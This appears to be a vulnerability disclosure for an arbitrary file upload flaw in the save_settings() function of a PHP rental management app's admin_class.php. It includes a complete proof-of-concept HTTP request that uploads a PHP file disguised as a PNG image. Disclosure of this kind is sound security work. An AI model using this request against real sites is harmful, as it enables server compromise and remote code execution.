#### There is an arbitrary file upload vulnerability in the save_settings() function of the file rental/admin_class.php.

**Code analysis**

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240910223944680.png)

The code logic is to first upload as a temporary file, and then use the function `move_uploaded_file` to move the temporary file to the `assets/uploads/` directory. There is no filtering for file extensions and content, so any file can be uploaded.

**Vulnerability reproduction**

poc

```http
POST /ajax.php?action=save_settings HTTP/1.1
Host: localhost:1110
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Content-Type: multipart/form-data; boundary=---------------------------303633564229447810934000106849
Content-Length: 716

-----------------------------303633564229447810934000106849
Content-Disposition: form-data; name="name"

test
-----------------------------303633564229447810934000106849
Content-Disposition: form-data; name="contact"

teatteat
-----------------------------303633564229447810934000106849
Content-Disposition: form-data; name="email"

testtest@qq.coma
-----------------------------303633564229447810934000106849
Content-Disposition: form-data; name="about"

hello world
-----------------------------303633564229447810934000106849
Content-Disposition: form-data; name="img"; filename="1.php" 
Content-Type: image/png  

<?php phpinfo();
-----------------------------303633564229447810934000106849--
```

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240910224103866.png)

As shown in the figure, successfully uploaded.

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240910224228185.png)

Parse the access path

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240910224257381.png)
